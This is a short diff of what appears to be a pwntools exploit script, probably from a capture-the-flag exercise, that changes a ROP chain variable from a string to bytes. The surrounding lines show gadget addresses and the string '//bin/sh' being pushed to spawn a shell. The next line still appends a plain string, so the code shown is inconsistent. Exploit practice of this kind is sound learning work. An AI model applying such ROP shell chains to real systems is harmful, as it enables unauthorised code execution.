@@ -7,7 +7,7 @@ p = process(binary.path)
 
 rebase_0 = lambda x : p64(x + binary.address)
 
-rop = ''
+rop = b''
 
 rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret;
 rop += '//bin/sh'
